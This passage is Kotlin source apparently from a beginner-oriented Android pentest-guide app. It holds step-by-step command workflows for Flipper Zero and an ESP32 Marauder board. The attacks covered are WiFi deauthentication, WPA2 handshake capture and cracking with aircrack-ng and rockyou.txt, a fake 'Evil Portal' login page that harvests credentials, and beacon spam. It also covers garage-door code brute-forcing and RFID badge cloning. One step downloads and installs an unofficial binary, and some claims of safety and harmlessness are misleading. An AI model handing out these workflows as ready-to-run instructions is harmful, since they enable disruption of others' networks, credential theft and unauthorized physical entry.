package com.twoskoops707.newpen.data

import com.twoskoops707.newpen.data.models.Category
import com.twoskoops707.newpen.data.models.Command
import com.twoskoops707.newpen.data.models.Device
import com.twoskoops707.newpen.data.models.Hardware
import com.twoskoops707.newpen.data.models.Workflow
import com.twoskoops707.newpen.data.models.WorkflowStep

object WorkflowRepository {

    private val allWorkflows: List<Workflow> = listOf(

        // ── SETUP ──────────────────────────────────────────────────────────────

        Workflow(
            id = "setup_momentum",
            title = "Install Momentum Firmware on Flipper",
            subtitle = "Upgrade your Flipper Zero with the best custom firmware",
            categoryId = "setup",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Phone or PC", "USB-C cable"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "What Is Momentum Firmware?",
                    description = "Momentum is a free upgrade for your Flipper Zero. It unlocks extra features like BLE Spam, more Sub-GHz frequencies, and a cooler interface. Think of it like jailbreaking — but totally safe and reversible.",
                    tips = listOf("This is the most popular custom firmware", "It's signed so it updates safely through the official app")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Install the Flipper Mobile App",
                    description = "On your Android phone, open Google Play Store. Search for 'Flipper Mobile App' (by Flipper Devices Inc). Install it — it's free.",
                    tips = listOf("This is the OFFICIAL app — it's safe to use", "You can also use qFlipper on a PC if you prefer")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Turn On Bluetooth on Flipper",
                    description = "On your Flipper, press the middle button to open the main menu. Use the D-pad arrows to scroll down to 'Settings'. Press OK. Scroll to 'Bluetooth'. Press OK. Make sure it says 'ON'.",
                    commands = listOf(
                        Command("Flipper menu path", "Settings → Bluetooth → Bluetooth → ON", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Pair Flipper to Your Phone",
                    description = "Open the Flipper Mobile App. Tap the big '+' button in the top right. Your Flipper should appear in the list — tap its name. Both your phone and Flipper will show a number — make sure they match, then tap 'Pair' on your phone.",
                    tips = listOf("If Flipper doesn't appear, make sure Bluetooth is ON on both devices")
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Update to Momentum",
                    description = "In the Flipper app, tap your connected Flipper. Tap the firmware version area. You'll see update options — select 'Release Channel' → 'Momentum'. Tap 'Update'. The download starts automatically.",
                    warning = "Do NOT close the app or unplug anything until the update finishes (about 5-10 minutes)",
                    tips = listOf("Your Flipper screen will flicker — that's normal during install")
                ),
                WorkflowStep(
                    stepNumber = 6,
                    title = "Confirm It Worked",
                    description = "When it reboots, you'll see 'Momentum' on the startup screen. Done! You now have the best Flipper firmware.",
                    tips = listOf("New stuff you unlocked: BLE Spam app, more frequencies, Control Center, GPS tracking")
                )
            )
        ),

        Workflow(
            id = "setup_marauder",
            title = "Flash AWOK with Marauder",
            subtitle = "Install the Marauder WiFi attack firmware on your AWOK Dual Mini v3",
            categoryId = "setup",
            hardware = listOf(Hardware.AWOK),
            prerequisites = listOf("AWOK Dual Mini v3", "PC with internet connection", "USB-C cable"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "What Is Marauder?",
                    description = "Marauder is the software (firmware) that makes your AWOK board do WiFi and Bluetooth attacks. Your AWOK probably already has it — you can check by plugging it in and seeing if the screen shows 'Marauder'. If yes, skip to the next workflow!",
                    tips = listOf("If your AWOK shows a Marauder boot screen, you're already done!")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Download the Easy Flash Tool",
                    description = "On your PC, go to this website: github.com/Fr4nkFletcher/ESP32-Marauder-Cheap-Yellow-Display/releases — Click the latest release, scroll down to Assets, and download 'FZEasyMarauderFlash.zip'. Extract the zip file.",
                    tips = listOf("This is the easiest way — it automatically picks the right file for your board")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Connect AWOK to PC in Flash Mode",
                    description = "FIRST hold down the 'BOOT' button on your AWOK board (small button on the side). WHILE holding BOOT, plug the USB-C cable into your PC. THEN let go of the BOOT button. The board is now in flash mode.",
                    warning = "If you don't hold BOOT while plugging in, it won't enter flash mode"
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Run the Flash Tool",
                    description = "Open the folder you extracted. Double-click 'flash.bat' (Windows) or 'flash.sh' (Mac/Linux). The tool will automatically find your AWOK, download the latest Marauder firmware, and install it. Watch the progress bar.",
                    tips = listOf("Takes about 2-3 minutes", "You'll see green text scrolling — that's normal")
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Reboot and Check",
                    description = "When the tool says 'Done!', unplug and replug your AWOK. You should see the Marauder logo and menus on screen. Success!",
                    tips = listOf("If it shows a Marauder menu with options like WiFi, BLE, Bluetooth — you're all set!")
                )
            )
        ),

        Workflow(
            id = "setup_connect_awok_flipper",
            title = "Connect AWOK to Flipper Zero",
            subtitle = "Wire up your AWOK Dual Mini v3 to control it through Flipper",
            categoryId = "setup",
            hardware = listOf(Hardware.BOTH),
            prerequisites = listOf("Flipper Zero", "AWOK Dual Mini v3 with Marauder", "GPIO cable or AWOK stacking connector"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Two Ways to Connect",
                    description = "You can connect AWOK to Flipper in two ways:\n1. DIRECT: Plug AWOK into Flipper's GPIO header (if your AWOK has a stacking connector) — the AWOK piggybacks on Flipper\n2. USB: Plug AWOK into your phone with USB-C OTG and control it with PenThis! app directly\n\nThe stacking connector method is much cooler — it's one unit!",
                    tips = listOf("The AWOK Dual Mini v3 is designed to stack on top of or connect to Flipper")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Install WiFi Marauder App on Flipper",
                    description = "This is the bridge app that lets Flipper talk to your AWOK.\n\nOn Flipper: press the middle button → scroll to 'Apps' → press OK → scroll to 'GPIO' → look for '[ESP32] WiFi Marauder' → press OK to open it.",
                    commands = listOf(
                        Command("Flipper navigation", "Apps → GPIO → [ESP32] WiFi Marauder", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "If you don't see the app: connect Flipper to phone → Flipper App → Apps → search WiFi Marauder → Install",
                        "Community app — free to download"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "First Time Setup in the App",
                    description = "When the WiFi Marauder app opens on Flipper, you'll see a terminal screen. Use the arrow buttons to scroll. The first time, select 'Setup' and set the baud rate to 115200 — this is the speed Flipper and AWOK talk to each other.",
                    tips = listOf("115200 = the speed setting — must match on both ends")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Test the Connection",
                    description = "In the Flipper app terminal, type: help\n\nPress the right arrow (or OK) to send. You should see a list of Marauder commands appear. If you see commands — AWOK is talking to Flipper successfully!",
                    commands = listOf(
                        Command("Test command", "help", Device.MARAUDER)
                    ),
                    tips = listOf("If nothing appears: check baud rate is 115200, check cables are seated properly")
                )
            )
        ),

        Workflow(
            id = "setup_pair_bt",
            title = "Pair Flipper to Your Android Phone",
            subtitle = "Link your phone and Flipper Zero via Bluetooth",
            categoryId = "setup",
            hardware = listOf(Hardware.FLIPPER, Hardware.PHONE),
            prerequisites = listOf("Flipper Zero", "Android phone", "Flipper Mobile App installed"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Turn On Flipper Bluetooth",
                    description = "On your Flipper, press the middle button. Scroll down to 'Settings' with the down arrow. Press OK. Scroll to 'Bluetooth'. Press OK. Set it to 'ON' if it's not already.",
                    commands = listOf(
                        Command("Menu path", "Settings → Bluetooth → Bluetooth → ON", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Open the Flipper App on Your Phone",
                    description = "Install 'Flipper Mobile App' from Google Play (search 'Flipper Mobile App' — it's free). Open the app. Make sure Bluetooth is ON on your phone too.",
                    tips = listOf("You only need to pair once — after that it connects automatically")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Connect Them Together",
                    description = "In the Flipper app, tap the '+' button. Your Flipper's name will appear. Tap it. Both your Flipper screen and phone will show the same number — make sure they match! Tap 'Pair' on your phone. Done.",
                    tips = listOf(
                        "The pair code only appears for 30 seconds — act quickly!",
                        "If pairing fails: turn Flipper BT off and back on, then try again"
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "What You Can Do Now",
                    description = "With the connection, you can:\n• Update firmware wirelessly\n• Download and install new apps\n• Use 'Remote Control' to control Flipper from your phone\n• Read NFC keys with the mfkey32 cracker tool",
                    tips = listOf("The app stays connected automatically whenever you're nearby")
                )
            )
        ),

        // ── WIFI ───────────────────────────────────────────────────────────────

        Workflow(
            id = "wifi_scan",
            title = "Scan All Nearby WiFi Networks",
            subtitle = "See every WiFi network and device around you",
            categoryId = "wifi",
            hardware = listOf(Hardware.AWOK, Hardware.FLIPPER),
            prerequisites = listOf("AWOK with Marauder firmware", "Either: Flipper with AWOK connected, OR AWOK plugged into phone via USB-C OTG"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open the Marauder Terminal",
                    description = "OPTION A — Via Flipper:\nOn Flipper, go to Apps → GPIO → [ESP32] WiFi Marauder. You'll see a black terminal screen.\n\nOPTION B — Via PenThis! app:\nPlug AWOK into phone with USB-C OTG cable. In PenThis!, tap 'Connect AWOK'. The terminal opens in the app.",
                    commands = listOf(
                        Command("Via Flipper", "Apps → GPIO → [ESP32] WiFi Marauder", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Start the WiFi Scan",
                    description = "Type 'scanap' and press the send button (right arrow on Flipper, or tap Send in app). Wait about 15 seconds. You'll see all the WiFi networks near you start popping up on screen.",
                    commands = listOf(
                        Command("Scan access points", "scanap", Device.MARAUDER)
                    ),
                    tips = listOf(
                        "Each line shows: network name (SSID), MAC address (BSSID), channel number, signal strength (RSSI), and security type (WPA2, Open, etc.)"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Stop the Scan",
                    description = "When you've seen enough, type 'stopscan' to stop.",
                    commands = listOf(
                        Command("Stop", "stopscan", Device.MARAUDER)
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "See the Full List",
                    description = "To see all the networks found (in a clean numbered list), type 'listap'. Each network gets a number — you'll use these numbers to target specific networks.",
                    commands = listOf(
                        Command("List all APs", "listap", Device.MARAUDER)
                    ),
                    tips = listOf("Write down the number of the network you want to work with!")
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Scan Who's Connected (Optional)",
                    description = "Want to see which devices (phones, laptops, etc.) are connected to nearby networks? Type 'scansta'. It shows connected devices by their MAC address.",
                    commands = listOf(
                        Command("Scan stations (clients)", "scansta", Device.MARAUDER)
                    )
                )
            )
        ),

        Workflow(
            id = "wifi_deauth",
            title = "Kick Devices Off a WiFi Network",
            subtitle = "Send deauth frames to disconnect clients from an access point",
            categoryId = "wifi",
            hardware = listOf(Hardware.AWOK, Hardware.FLIPPER),
            prerequisites = listOf("AWOK with Marauder", "Flipper OR phone with PenThis!"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Scan and Find Your Target",
                    description = "Type 'scanap' — wait 15 seconds — type 'stopscan' — then type 'listap'. Find the network you want (only do this on YOUR OWN network!) and note its number. For example, if your network shows up as #2, you'll use 2.",
                    commands = listOf(
                        Command("Scan", "scanap", Device.MARAUDER),
                        Command("Stop", "stopscan", Device.MARAUDER),
                        Command("List", "listap", Device.MARAUDER)
                    ),
                    warning = "Only test on networks you own or have written permission to test. Attacking others' networks is illegal."
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Pick Your Target Network",
                    description = "Type 'select -a' followed by the number from the list. For example, if your network was #2, type: select -a 2\n\nThis 'aims' the AWOK at that specific network.",
                    commands = listOf(
                        Command("Select network #0", "select -a 0", Device.MARAUDER),
                        Command("Select network #1", "select -a 1", Device.MARAUDER)
                    ),
                    tips = listOf("Replace 0 with your actual network number from the listap output")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Launch the Deauth Attack",
                    description = "Type 'attack -t deauth' and press Send. The AWOK starts sending 'disconnect' messages to all devices on that network. Phones, laptops, and smart TVs will lose WiFi.",
                    commands = listOf(
                        Command("Start deauth", "attack -t deauth", Device.MARAUDER)
                    ),
                    tips = listOf(
                        "Devices will try to reconnect automatically — this is actually useful for capturing handshakes (see the PMKID capture workflow)",
                        "Works for about 10 meters around you"
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Stop the Attack",
                    description = "Type 'stopscan' to stop. All devices will reconnect automatically after you stop.",
                    commands = listOf(
                        Command("Stop", "stopscan", Device.MARAUDER)
                    )
                )
            )
        ),

        Workflow(
            id = "wifi_pmkid",
            title = "Capture WiFi Password & Crack It",
            subtitle = "Capture WPA2 handshake with AWOK, then crack with aircrack-ng in Termux",
            categoryId = "wifi",
            hardware = listOf(Hardware.AWOK, Hardware.FLIPPER, Hardware.PHONE),
            prerequisites = listOf("AWOK with Marauder + Flipper", "Termux app on phone from F-Droid", "aircrack-ng installed in Termux (see Tools section)"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Scan and Pick Your Network",
                    description = "Type 'scanap', wait, 'stopscan', then 'listap'. Find your target network and note its number. Then type: select -a NUMBER",
                    commands = listOf(
                        Command("Scan", "scanap", Device.MARAUDER),
                        Command("Stop & list", "stopscan && listap", Device.MARAUDER),
                        Command("Select (use your number)", "select -a 0", Device.MARAUDER)
                    ),
                    warning = "Only capture from your own network or networks you have permission to test"
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Start PMKID Capture",
                    description = "Type 'sniffpmkid' and press Send. The AWOK quietly listens for the special handshake packets that routers send. You don't need to kick anyone off — it just waits and listens.",
                    commands = listOf(
                        Command("Capture PMKID", "sniffpmkid", Device.MARAUDER)
                    ),
                    tips = listOf(
                        "Wait 30-60 seconds. The more devices actively connected to that router, the faster you'll get a capture",
                        "You'll see 'PMKID found' on screen when successful"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Speed It Up (Optional Deauth Trick)",
                    description = "If nothing is captured after 60 seconds, run a quick deauth to make devices reconnect (which sends handshake packets):\nType 'stopscan', then 'attack -t deauth', wait 5 seconds, then 'stopscan', then 'sniffpmkid' again.",
                    commands = listOf(
                        Command("Quick deauth boost", "attack -t deauth", Device.MARAUDER)
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Stop and Find the Capture File",
                    description = "Type 'stopscan'. The AWOK automatically saves the capture file to Flipper's SD card.\n\nTo find it: connect Flipper to your phone via USB. On your phone's file manager, go to Flipper's storage → apps_data → marauder → pcaps → you'll see a .pcap file.",
                    commands = listOf(
                        Command("Stop capture", "stopscan", Device.MARAUDER)
                    ),
                    tips = listOf("Copy the .pcap file to your phone's Downloads folder — you need it for the next steps")
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Install aircrack-ng in Termux",
                    description = "Open Termux. Type these commands one at a time and press Enter after each. This installs aircrack-ng which can crack the .pcap file directly.",
                    commands = listOf(
                        Command("Step 1 — update", "apt update && apt upgrade -y", Device.TERMUX),
                        Command("Step 2 — get wget", "pkg install wget -y", Device.TERMUX),
                        Command("Step 3 — install libraries", "apt install libc++ libnl libpcap libsqlite openssl pcre zlib -y", Device.TERMUX),
                        Command("Step 4 — download aircrack-ng", "wget https://raw.githubusercontent.com/pitube08642/aircrack-ng-for-termux/main/dists/termux/aircrack-ng/binary-aarch64/aircrack-ng_3_1.7_aarch64.deb", Device.TERMUX),
                        Command("Step 5 — install it", "dpkg -i aircrack-ng_3_1.7_aarch64.deb", Device.TERMUX)
                    ),
                    tips = listOf("aircrack-ng is NOT in the normal Termux store — you must download it this special way")
                ),
                WorkflowStep(
                    stepNumber = 6,
                    title = "Download a Password List",
                    description = "In Termux, download the rockyou.txt wordlist (14 million real passwords). Type this and press Enter:",
                    commands = listOf(
                        Command("Download wordlist", "wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt", Device.TERMUX)
                    ),
                    tips = listOf("This is a 130MB download — use WiFi!", "Takes about 2-5 minutes to download")
                ),
                WorkflowStep(
                    stepNumber = 7,
                    title = "Crack the Password",
                    description = "Copy your .pcap file from the Flipper SD card to your Downloads folder. Then in Termux, run aircrack-ng on it:",
                    commands = listOf(
                        Command("Crack with wordlist", "aircrack-ng -w ~/rockyou.txt /sdcard/Download/capture.cap", Device.TERMUX)
                    ),
                    tips = listOf(
                        "Replace 'capture.cap' with your actual file name",
                        "If the password is in rockyou.txt, aircrack-ng will find it and show it on screen",
                        "Common passwords crack in seconds — weird passwords may not crack at all"
                    )
                )
            )
        ),

        Workflow(
            id = "wifi_evilportal",
            title = "Evil Portal — Fake WiFi Login Page",
            subtitle = "Create a fake WiFi network that captures usernames and passwords",
            categoryId = "wifi",
            hardware = listOf(Hardware.AWOK, Hardware.FLIPPER),
            prerequisites = listOf("AWOK with Marauder", "Flipper with WiFi Marauder app"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "How This Works",
                    description = "The AWOK creates a fake WiFi network. When someone connects to it, instead of getting the internet, they get a fake 'login page' that looks like a router setup page. Whatever they type in gets saved to the SD card.\n\nOnly do this on your own devices or with permission.",
                    warning = "Only test this on your own network and devices"
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Find the Real Network Name",
                    description = "First, scan to find the name (SSID) of the real network you want to mimic:\nType 'scanap' → wait → 'stopscan' → 'listap'\n\nWrite down the exact network name — capital letters and spaces matter!",
                    commands = listOf(
                        Command("Find real SSID", "scanap", Device.MARAUDER)
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Start the Evil Portal",
                    description = "In the WiFi Marauder app on Flipper, scroll the menu to 'Evil Portal'. Press OK. You'll see options to set the fake network name. Enter the EXACT same name as the real network.",
                    commands = listOf(
                        Command("Start evil portal", "evilportal", Device.MARAUDER)
                    ),
                    tips = listOf(
                        "The AWOK creates a new WiFi network with the same name",
                        "Optional: at the same time, run deauth on the real network to push people off it"
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Wait for Connections",
                    description = "Devices will try to connect to what they think is the real network. Their browsers will automatically open the fake login page. The page looks like a router config page asking for WiFi password.",
                    tips = listOf(
                        "Anything they type gets saved automatically",
                        "Credentials are stored at: apps_data/marauder/ on Flipper SD card"
                    )
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Retrieve the Captured Data",
                    description = "Type 'stopscan' to stop the portal. Connect Flipper to your phone via USB. Go to Flipper storage → apps_data → marauder → you'll find a text file with any captured credentials.",
                    commands = listOf(
                        Command("Stop", "stopscan", Device.MARAUDER)
                    )
                )
            )
        ),

        Workflow(
            id = "wifi_beacon_spam",
            title = "Flood Area with Fake WiFi Names",
            subtitle = "Create hundreds of fake WiFi networks to spam everyone nearby",
            categoryId = "wifi",
            hardware = listOf(Hardware.AWOK, Hardware.FLIPPER),
            prerequisites = listOf("AWOK with Marauder", "Flipper with WiFi Marauder app"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open Marauder on Flipper",
                    description = "On Flipper: Apps → GPIO → [ESP32] WiFi Marauder",
                    commands = listOf(
                        Command("Open app", "Apps → GPIO → [ESP32] WiFi Marauder", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Start Beacon Spam",
                    description = "Type 'attack -t beacon' and press Send. The AWOK immediately starts broadcasting around 100 fake WiFi network names. Anyone nearby opens their WiFi settings and sees a huge confusing list of random network names.",
                    commands = listOf(
                        Command("Beacon spam", "attack -t beacon", Device.MARAUDER)
                    ),
                    tips = listOf(
                        "This is harmless — it just creates fake advertisements, no real networks",
                        "Other people's WiFi still works fine — just looks messy in their settings"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Stop Whenever You Want",
                    description = "Type 'stopscan' to stop. All the fake networks disappear from everyone's WiFi list immediately.",
                    commands = listOf(
                        Command("Stop", "stopscan", Device.MARAUDER)
                    )
                )
            )
        ),

        // ── SUB-GHZ ────────────────────────────────────────────────────────────

        Workflow(
            id = "subghz_read_replay",
            title = "Copy and Replay a Remote Control",
            subtitle = "Record any RF remote and replay it from your Flipper",
            categoryId = "subghz",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "A remote control you want to copy"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open Sub-GHz on Flipper",
                    description = "Press the middle button on Flipper. Scroll to 'Sub-GHz'. Press OK. This is where all the radio magic happens.",
                    commands = listOf(
                        Command("Open menu", "Main Menu → Sub-GHz", Device.FLIPPER_CLI)
                    ),
                    tips = listOf("Sub-GHz = radio signals below 1 GHz (like 433 MHz, 315 MHz, 868 MHz)")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Start Reading",
                    description = "Scroll to 'Read' and press OK. Flipper is now listening for radio signals. Point your remote at the Flipper (Flipper doesn't need to face it — just be within arm's reach). Press the button on your remote.",
                    commands = listOf(
                        Command("Start read", "Sub-GHz → Read", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "Works on: gate remotes, old garage door openers, RF doorbells, remote outlets, alarm keyfobs",
                        "When Flipper receives it, you'll see: frequency, protocol name, and the key code"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Save What You Captured",
                    description = "After Flipper shows the signal info, press OK to save it. Type a name for it (like 'Front_Gate' or 'Garage') and press OK.",
                    tips = listOf("Use a name that helps you remember what it does")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Send the Signal",
                    description = "To replay it: Sub-GHz → Saved → scroll to your saved signal → press OK → scroll to 'Send' → press OK.\n\nPoint your Flipper at the receiver (like the gate box or doorbell). It will trigger just like the real remote.",
                    commands = listOf(
                        Command("Replay saved signal", "Sub-GHz → Saved → [your signal] → Send", Device.FLIPPER_CLI)
                    )
                )
            )
        ),

        Workflow(
            id = "subghz_brute_garage",
            title = "Open an Older Garage Door (Brute Force)",
            subtitle = "Cycle through all codes to find one that opens a fixed-code garage door",
            categoryId = "subghz",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero with Momentum firmware", "Sub-GHz Bruteforcer app installed on Flipper"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Does This Work on Your Door?",
                    description = "This ONLY works on older 'fixed code' garage doors. Modern doors have 'rolling codes' which change every press.\n\nFixed code brands (usually work): CAME, Nice, BFT, Tedsen, Genie (pre-2005), Chamberlain/LiftMaster (pre-2011)\nRolling code (WON'T work): Any door labeled 'Security+', 'Security+ 2.0', 'myQ'\n\nLook at your remote — if it says 'Security+', it's rolling code and this method won't work.",
                    warning = "Only attempt on your own property"
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Install the Bruteforcer App",
                    description = "On Flipper, go to Apps → Sub-GHz → Sub-GHz Bruteforcer.\n\nIf it's not there: connect Flipper to phone → open Flipper app → Apps Store → search 'Bruteforcer' → install the Sub-GHz Bruteforcer app.",
                    commands = listOf(
                        Command("Open app", "Apps → Sub-GHz → Sub-GHz Bruteforcer", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Pick the Right Protocol",
                    description = "In the Bruteforcer app, scroll to your door brand:\n• CAME (12-bit) — for CAME and BFT doors\n• Nice Flo — for Nice brand doors\n• Chamberlain — for pre-2011 LiftMaster/Chamberlain\n• Linear — common in USA\n\nIf you don't know the brand, try them in order.",
                    tips = listOf("The most common US brand is Chamberlain/LiftMaster")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Pick the Frequency",
                    description = "Select the frequency:\n• 315 MHz — most North American garage doors\n• 433.92 MHz — European doors\n• 868 MHz — some European systems\n\nIf in doubt, try 315 MHz first (USA standard)."
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Generate the Code File",
                    description = "Select '1 file (De Bruijn)'. This creates a special optimized sequence that tests ALL 4096 codes in the shortest possible time — like a master key that tries every combination at once.",
                    tips = listOf("De Bruijn is the smart way — instead of sending codes one by one, it overlaps them so 4096 codes take way fewer transmissions")
                ),
                WorkflowStep(
                    stepNumber = 6,
                    title = "Stand Near the Door and Transmit",
                    description = "Stand within 5-10 feet of the garage door's receiver (the box on the ceiling). Press 'Send' on Flipper. Hold Flipper pointing at the receiver. The Flipper cycles through all codes automatically — your garage door will open when the right code is sent.",
                    warning = "Only test on your own garage door",
                    tips = listOf(
                        "12-bit sequence takes about 2-4 minutes to complete",
                        "If it doesn't open in one pass, try a second pass",
                        "Closer = better, try to be within 10 feet"
                    )
                )
            )
        ),

        Workflow(
            id = "subghz_raw",
            title = "Record Unknown RF Signals (RAW Mode)",
            subtitle = "Capture raw radio signals from devices with unknown protocols",
            categoryId = "subghz",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "When to Use RAW Mode",
                    description = "Regular 'Read' mode only captures signals it recognizes. RAW mode records EVERYTHING as raw waveform data — like recording audio vs. transcribing words. Use RAW for:\n• Unknown brand remotes\n• Alarm sensors\n• Industrial equipment\n• Rolling code remotes (for analysis)",
                    tips = listOf("RAW files are bigger but capture everything")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Find the Frequency First",
                    description = "Go to Sub-GHz → Frequency Analyzer. Point your remote at Flipper and press the button. You'll see a spike at the frequency the remote uses. Write that number down.",
                    commands = listOf(
                        Command("Open frequency analyzer", "Sub-GHz → Frequency Analyzer", Device.FLIPPER_CLI)
                    ),
                    tips = listOf("Common frequencies: 315 MHz, 433.92 MHz, 868 MHz")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Switch to RAW Read Mode",
                    description = "Go back: Sub-GHz → Read RAW. If you know the frequency, set it manually. Otherwise leave it on Auto.",
                    commands = listOf(
                        Command("Open RAW mode", "Sub-GHz → Read RAW", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Capture the Signal",
                    description = "Press OK to start recording. Press the button on your remote. Press OK to stop recording. The RAW waveform is saved as a .sub file.",
                    tips = listOf("The signal gets saved even if Flipper doesn't know what protocol it is")
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Replay the RAW Signal",
                    description = "Sub-GHz → Saved → find your RAW file → Send.\n\nThis plays back the exact raw waveform. Often works even without knowing the protocol.",
                    commands = listOf(
                        Command("Replay RAW", "Sub-GHz → Saved → [RAW file] → Send", Device.FLIPPER_CLI)
                    ),
                    tips = listOf(
                        "For rolling codes: RAW replay might work one time if the captured code hasn't been used yet",
                        "For analysis: copy the .sub file to PC and open in Universal Radio Hacker (free tool)"
                    )
                )
            )
        ),

        // ── RFID ───────────────────────────────────────────────────────────────

        Workflow(
            id = "rfid_read",
            title = "Read an RFID Access Card or Key Fob",
            subtitle = "Capture the data from any 125kHz RFID badge",
            categoryId = "rfid",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "An RFID card or key fob (the flat ones with just a chip inside)"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open 125 kHz RFID",
                    description = "Press Flipper's middle button. Scroll down to '125 kHz RFID'. Press OK.\n\n(Note: NFC is a different menu — 125 kHz RFID is for older building access cards. If your card works by just waving it near a reader, it's probably this type.)",
                    commands = listOf(
                        Command("Open menu", "Main Menu → 125 kHz RFID", Device.FLIPPER_CLI)
                    ),
                    tips = listOf("125 kHz = thicker plastic cards and chunky key fobs used for doors and parking")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Press Read",
                    description = "Scroll to 'Read' and press OK. Flipper is now scanning.",
                    commands = listOf(
                        Command("Start reading", "125 kHz RFID → Read", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Hold the Card Against Flipper",
                    description = "Place your card FLAT on the BACK of your Flipper Zero. The antenna is on the back — the card needs to be centered there. Hold it completely still.",
                    tips = listOf(
                        "If nothing happens after 5 seconds, slide the card around slightly",
                        "HID Prox cards (office building fobs) need to be pressed REALLY close — like touching the back",
                        "EM4100 cards (most common type) read almost instantly"
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "See What Flipper Found",
                    description = "When the card is read, Flipper shows:\n• Card type (EM4100, HID Prox, Indala, etc.)\n• A unique number (the UID)\n• Facility Code and Card Number (for building access cards)\n\nThis is the identity of your card.",
                    tips = listOf("The UID is unique to your card — like a fingerprint")
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Save It",
                    description = "Press OK and type a name. Something descriptive like 'Work_Badge' or 'Gym_Key'. Press OK to save.",
                    tips = listOf("You can now emulate or clone this card from the Saved menu")
                )
            )
        ),

        Workflow(
            id = "rfid_emulate",
            title = "Use Flipper as Your Access Card",
            subtitle = "Make Flipper pretend to be any saved RFID badge",
            categoryId = "rfid",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "A saved RFID card in Flipper (read it first)"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Go to Your Saved Cards",
                    description = "From the main menu: 125 kHz RFID → Saved. You'll see a list of all the cards you've read. Scroll to the one you want to use.",
                    commands = listOf(
                        Command("Open saved cards", "125 kHz RFID → Saved", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Start Emulation",
                    description = "Tap the card name. Scroll to 'Emulate'. Press OK. Flipper is now broadcasting as that card. Your Flipper IS the card right now.",
                    commands = listOf(
                        Command("Emulate card", "125 kHz RFID → Saved → [card name] → Emulate", Device.FLIPPER_CLI)
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
